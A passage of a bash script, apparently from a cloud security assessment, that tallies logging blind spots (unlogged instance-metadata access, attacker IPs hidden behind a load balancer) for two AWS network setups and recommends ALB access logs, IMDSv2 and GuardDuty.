# IMDS is INVISIBLE in both
detection_gaps=$(( detection_gaps + 1 ))

# HTTP/SSRF source IP is HIDDEN in Config B
if [[ "${CONFIG_MODE}" == "private" ]]; then
    detection_gaps=$(( detection_gaps + 1 ))
    echo -e "  Detection gaps identified: ${detection_gaps}"
    echo -e "    - IMDS access: INVISIBLE (link-local, no Flow Log)"
    echo -e "    - HTTP/SSRF attacker IP: HIDDEN (ALB proxy, requires ALB access logs)"
    echo ""
    print_vulnerable "Config B has ${detection_gaps} detection gaps — ALB access logs are MANDATORY for forensics"
    result_text+=$'\n'"Overall verdict: VULNERABLE to detection gaps"$'\n'
    result_text+="  Gap count: ${detection_gaps}"$'\n'
    result_text+="  Gap 1: IMDS access invisible (link-local, no Flow Log)"$'\n'
    result_text+="  Gap 2: HTTP attacker IP hidden by ALB (requires ALB access logs)"$'\n'
    result_text+="  Action: Enable ALB access logs + enforce IMDSv2"$'\n'
else
    echo -e "  Detection gaps identified: ${detection_gaps}"
    echo -e "    - IMDS access: INVISIBLE (link-local, no Flow Log)"
    echo ""
    print_vulnerable "Config A has ${detection_gaps} detection gap — IMDS theft leaves no network-level trace"
    result_text+=$'\n'"Overall verdict: PARTIAL detection gap"$'\n'
    result_text+="  Gap count: ${detection_gaps}"$'\n'
    result_text+="  Gap 1: IMDS access invisible (link-local, no Flow Log)"$'\n'
    result_text+="  Advantage: HTTP attacker IP is directly visible in Flow Logs"$'\n'
    result_text+="  Action: Enforce IMDSv2 + enable GuardDuty"$'\n'
fi

echo ""
echo -e "${BLUE}[*] Summary: Detection is a separate concern from prevention.${NC}"
echo -e "  Even if Config B prevents direct SSH access, its default configuration"
echo -e "  hides attacker IPs for HTTP-based attacks — the primary attack vector."
echo -e "  Good detection requires enabling ALB access logs, WAF, GuardDuty,"
echo -e "  and application-level logging regardless of subnet configuration."
echo ""

result_text+=$'\n'"Summary: Detection requires ALB access logs, WAF, GuardDuty, and app logging"$'\n'
result_text+="regardless of subnet configuration. Prevention and detection are separate concerns."$'\n'

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "Detection & Visibility Analysis complete"
